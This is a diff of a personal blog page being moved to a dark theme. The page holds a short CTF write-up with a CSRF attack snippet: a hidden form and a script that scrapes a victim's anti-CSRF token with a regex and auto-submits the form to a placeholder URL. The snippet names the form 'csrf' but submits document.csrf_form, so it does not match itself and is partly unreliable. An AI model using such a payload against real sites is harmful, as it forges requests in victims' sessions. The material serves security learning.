@@ -43,11 +43,17 @@
     
       
       
-      <link rel="stylesheet" href="https://ajdin.io/css/coder.min.25dead06d06a3a86c2ff00e89506994da7e12f76d83f8cd22a40b144dc7ff1bd.css" integrity="sha256-Jd6tBtBqOobC/wDolQaZTafhL3bYP4zSKkCxRNx/8b0=" crossorigin="anonymous" media="screen" />
+      <link rel="stylesheet" href="https://ajdin.io/css/coder.min.4a28856a95e3501277551f73ab1c016dda3b5fd8733a791aedf596ee168b778e.css" integrity="sha256-SiiFapXjUBJ3VR9zqxwBbdo7X9hzOnka7fWW7haLd44=" crossorigin="anonymous" media="screen" />
     
 
     
 
+    
+      
+        
+        
+        <link rel="stylesheet" href="https://ajdin.io/css/coder-dark.min.329d0cb78d7aa737352ab5e9c025b96047573198980c0de02716d2def518e325.css" integrity="sha256-Mp0Mt416pzc1KrXpwCW5YEdXMZiYDA3gJxbS3vUY4yU=" crossorigin="anonymous" media="screen" />
+      
     
 
     
@@ -64,7 +70,9 @@
 
   
   
-  <body class="colorscheme-light">
+    
+  
+  <body class="colorscheme-dark">
     <main class="wrapper">
       <nav class="navigation">
   <section class="container">
@@ -132,23 +140,23 @@
 
 
         <p>So I was doing a CTF challenge and I have learned how to bypass CSRF token protection with extracting the token. I had to remove the CSRF code as the CTF forbids leaking solutions.</p>
-<div class="highlight"><pre style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#666">&lt;</span>form action<span style="color:#666">=</span><span style="color:#4070a0">&#34;&lt;url goes here&gt;&#34;</span> method<span style="color:#666">=</span><span style="color:#4070a0">&#34;post&#34;</span> name<span style="color:#666">=</span><span style="color:#4070a0">&#34;csrf&#34;</span> enctype<span style="color:#666">=</span><span style="color:#4070a0">&#34;multipart/form-data&#34;</span><span style="color:#666">&gt;</span>
-                <span style="color:#666">&lt;</span>input ... <span style="color:#666">/&gt;</span>
-                <span style="color:#666">&lt;</span>input id<span style="color:#666">=</span><span style="color:#4070a0">&#34;token&#34;</span> type<span style="color:#666">=</span><span style="color:#4070a0">&#34;hidden&#34;</span> name<span style="color:#666">=</span><span style="color:#4070a0">&#34;token&#34;</span> value<span style="color:#666">=</span><span style="color:#4070a0">&#34;&#34;</span> <span style="color:#666">/&gt;</span>
-                <span style="color:#666">&lt;</span>button type<span style="color:#666">=</span><span style="color:#4070a0">&#34;submit&#34;</span><span style="color:#666">&gt;</span>Submit<span style="color:#666">&lt;</span><span style="">/button&gt;</span>
-<span style="color:#666">&lt;</span><span style="">/form&gt;</span>
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js">&lt;form action=<span style="color:#ed9d13">&#34;&lt;url goes here&gt;&#34;</span> method=<span style="color:#ed9d13">&#34;post&#34;</span> name=<span style="color:#ed9d13">&#34;csrf&#34;</span> enctype=<span style="color:#ed9d13">&#34;multipart/form-data&#34;</span>&gt;
+                &lt;input ... /&gt;
+                &lt;input id=<span style="color:#ed9d13">&#34;token&#34;</span> type=<span style="color:#ed9d13">&#34;hidden&#34;</span> name=<span style="color:#ed9d13">&#34;token&#34;</span> value=<span style="color:#ed9d13">&#34;&#34;</span> /&gt;
+                &lt;button type=<span style="color:#ed9d13">&#34;submit&#34;</span>&gt;Submit&lt;<span style="color:#a61717;background-color:#e3d2d2">/button&gt;</span>
+&lt;<span style="color:#a61717;background-color:#e3d2d2">/form&gt;</span>
 
-<span style="color:#666">&lt;</span>script<span style="color:#666">&gt;</span>
-                xhttp <span style="color:#666">=</span> <span style="color:#007020;font-weight:bold">new</span> XMLHttpRequest();
-                xhttp.open(<span style="color:#4070a0">&#34;GET&#34;</span>, <span style="color:#4070a0">&#34;&lt;url goes here&gt;&#34;</span>, <span style="color:#007020;font-weight:bold">false</span>);
+&lt;script&gt;
+                xhttp = <span style="color:#6ab825;font-weight:bold">new</span> XMLHttpRequest();
+                xhttp.open(<span style="color:#ed9d13">&#34;GET&#34;</span>, <span style="color:#ed9d13">&#34;&lt;url goes here&gt;&#34;</span>, <span style="color:#6ab825;font-weight:bold">false</span>);
                 xhttp.send();
 
-                token_admin <span style="color:#666">=</span> (xhttp.responseText.match(<span style="color:#235388">/[abcdef0123456789]{32}/</span>));
+                token_admin = (xhttp.responseText.match(<span style="color:#ed9d13">/[abcdef0123456789]{32}/</span>));
 
-                <span style="color:#007020">document</span>.getElementById(<span style="color:#4070a0">&#39;token&#39;</span>).setAttribute(<span style="color:#4070a0">&#39;value&#39;</span>, token_admin)
+                <span style="color:#24909d">document</span>.getElementById(<span style="color:#ed9d13">&#39;token&#39;</span>).setAttribute(<span style="color:#ed9d13">&#39;value&#39;</span>, token_admin)
 
-                <span style="color:#007020">document</span>.csrf_form.submit();
-<span style="color:#666">&lt;</span><span style="">/script&gt;</span>
+                <span style="color:#24909d">document</span>.csrf_form.submit();
+&lt;<span style="color:#a61717;background-color:#e3d2d2">/script&gt;</span>
 </code></pre></div><p>What is this token? Well one way to protect your site from CSRF attacks it to use tokens to validate if the request is being authentic, so we have to switch our token with victims token.</p>
 <p>The code is pretty easy to understand. This code inside the <code>&lt;script&gt;</code> tag is executed on our victims machine, and it loads a new <code>HTTP</code> request, finds the token using regular expressions and replaces it. Now our form has a valid token and we can submit it.</p>
 
